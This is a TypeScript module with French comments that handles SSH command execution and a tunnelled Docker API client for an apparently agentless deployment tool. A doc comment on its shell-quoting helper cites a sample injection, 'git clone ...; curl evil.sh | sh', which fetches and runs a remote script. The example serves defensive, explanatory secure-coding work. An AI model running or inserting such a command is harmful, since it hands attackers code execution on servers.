// Accès aux serveurs cibles. Agentless : rien à installer en face, tout passe
// par SSH.
//
// Deux chemins distincts, et il faut comprendre pourquoi il y en a deux :
//
//   exec()          lance une commande dans un shell distant. Nécessaire pour
//                   ce qui n'a pas d'API : nixpacks, git, l'installation de
//                   Docker. La sortie est du texte, à streamer.
//
//   dockerClient()  parle à l'API Docker Engine à travers un tunnel SSH vers
//                   /var/run/docker.sock. Réponses structurées, pas de parsing
//                   de texte — et la Phase 0 a montré pourquoi ça compte :
//                   `docker service update` renvoie 0 après un rollback, donc
//                   l'état réel ne se lit que dans UpdateStatus.State.
//
// L'utilisateur SSH DOIT appartenir au groupe `docker`. dockerode se connecte
// au socket directement : il n'y a pas de `sudo` possible sur une socket.
import http from "node:http";
import Docker from "dockerode";
import { Client, type ConnectConfig } from "ssh2";

export interface ServerCredentials {
	host: string;
	port?: number;
	user: string;
	/** Clé privée au format PEM. Chiffrée au repos côté base, déchiffrée ici. */
	privateKey: string;
	passphrase?: string;
}

export interface ExecResult {
	stdout: string;
	stderr: string;
	code: number | null;
	signal?: string;
}

export class SshError extends Error {
	constructor(
		message: string,
		readonly host: string,
		readonly cause?: unknown,
	) {
		super(message);
		this.name = "SshError";
	}
}

function connectConfig(creds: ServerCredentials): ConnectConfig {
	return {
		host: creds.host,
		port: creds.port ?? 22,
		username: creds.user,
		privateKey: creds.privateKey,
		passphrase: creds.passphrase,
		// Un déploiement dure des minutes. Sans keepalive, un NAT ou un pare-feu
		// coupe la session au milieu d'un build et l'échec est illisible.
		keepaliveInterval: 15_000,
		keepaliveCountMax: 8,
		readyTimeout: 20_000,
	};
}

export function connect(creds: ServerCredentials): Promise<Client> {
	return new Promise((resolve, reject) => {
		const client = new Client();
		const onError = (err: Error) => {
			client.removeAllListeners();
			reject(
				new SshError(`connexion SSH échouée: ${err.message}`, creds.host, err),
			);
		};
		client.once("ready", () => {
			client.removeListener("error", onError);
			resolve(client);
		});
		client.once("error", onError);
		client.connect(connectConfig(creds));
	});
}

export interface ExecOptions {
	/** Appelé ligne par ligne. C'est ce qui alimentera le flux SSE des logs. */
	onStdout?: (chunk: string) => void;
	onStderr?: (chunk: string) => void;
}

export function exec(
	client: Client,
	command: string,
	opts: ExecOptions = {},
): Promise<ExecResult> {
	return new Promise((resolve, reject) => {
		client.exec(command, (err, stream) => {
			if (err) return reject(err);

			let stdout = "";
			let stderr = "";
			let code: number | null = null;
			let signal: string | undefined;

			stream.on("data", (d: Buffer) => {
				const s = d.toString("utf8");
				stdout += s;
				opts.onStdout?.(s);
			});
			stream.stderr.on("data", (d: Buffer) => {
				const s = d.toString("utf8");
				stderr += s;
				opts.onStderr?.(s);
			});
			// `exit` porte le code, `close` marque la fin réelle du flux. Résoudre
			// sur `exit` tronque la sortie.
			stream.on("exit", (c: number | null, sig?: string) => {
				code = c;
				signal = sig;
			});
			stream.on("close", () => resolve({ stdout, stderr, code, signal }));
		});
	});
}

/**
 * Échappe un argument pour un shell POSIX.
 *
 * `exec()` transmet une CHAÎNE, que le shell distant interprète. Tout ce qui
 * vient de l'utilisateur — URL de dépôt, nom de branche, domaine, nom de
 * service, valeur de variable d'environnement — est une injection de commande
 * sur le serveur du client si on le concatène tel quel :
 *
 *     git clone https://x/y.git; curl evil.sh | sh
 *
 * Guillemets simples partout, et la seule séquence à traiter est le guillemet
 * simple lui-même : on ferme, on en insère un échappé, on rouvre.
 */
export function quoteArg(arg: string): string {
	return `'${arg.replaceAll("'", `'\\''`)}'`;
}

/**
 * Variante sûre d'`exec` : la commande est un tableau, chaque élément est
 * échappé. À PRÉFÉRER systématiquement dès qu'une valeur ne vient pas d'une
 * constante du code.
 */
export function execArgv(
	client: Client,
	argv: readonly string[],
	opts: ExecOptions = {},
): Promise<ExecResult> {
	if (argv.length === 0) throw new TypeError("argv vide");
	return exec(client, argv.map(quoteArg).join(" "), opts);
}

export function disconnect(client: Client): void {
	client.end();
}

/** Ouvre une connexion, exécute, referme — même si `fn` lève. */
export async function withServer<T>(
	creds: ServerCredentials,
	fn: (client: Client) => Promise<T>,
): Promise<T> {
	const client = await connect(creds);
	try {
		return await fn(client);
	} finally {
		disconnect(client);
	}
}

/**
 * Agent HTTP dont chaque connexion est un canal SSH vers la socket Docker
 * distante. C'est l'extension OpenSSH `direct-streamlocal@openssh.com`, la
 * même que `ssh -L /chemin/local:/var/run/docker.sock`.
 */
class SshSocketAgent extends http.Agent {
	constructor(
		private readonly client: Client,
		private readonly socketPath: string,
	) {
		super({ keepAlive: true, maxSockets: 8 });
	}

	// La signature de createConnection n'est pas exposée dans les types de
	// node:http ; on la surcharge en connaissance de cause.
	createConnection(
		_options: unknown,
		callback: (err: Error | null, stream?: NodeJS.ReadWriteStream) => void,
	): void {
		this.client.openssh_forwardOutStreamLocal(
			this.socketPath,
			(err, stream) => {
				if (err) return callback(err);
				callback(null, stream);
			},
		);
	}
}

export interface DockerClientOptions {
	socketPath?: string;
}

/**
 * Client Docker branché sur le daemon distant via le tunnel SSH déjà ouvert.
 *
 * L'hôte et le port passés à dockerode sont fictifs : l'agent ignore les deux
 * et forwarde toujours vers la socket. Ils ne servent qu'à faire construire à
 * dockerode des URL HTTP valides.
 */
export function dockerClient(
	client: Client,
	opts: DockerClientOptions = {},
): Docker {
	const socketPath = opts.socketPath ?? "/var/run/docker.sock";
	return new Docker({
		protocol: "http",
		host: "docker",
		port: 80,
		agent: new SshSocketAgent(client, socketPath),
	} as Docker.DockerOptions);
}
